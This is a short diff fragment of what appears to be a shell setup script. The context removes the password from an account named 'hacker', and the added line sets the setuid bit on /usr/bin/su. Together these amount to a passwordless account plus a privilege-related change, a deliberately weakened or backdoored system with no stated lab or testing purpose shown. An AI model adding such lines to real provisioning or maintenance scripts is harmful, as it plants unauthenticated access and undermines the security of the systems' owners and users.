@@ -18,3 +18,4 @@ else
 fi
 
 passwd -d hacker
+chmod u+s /usr/bin/su
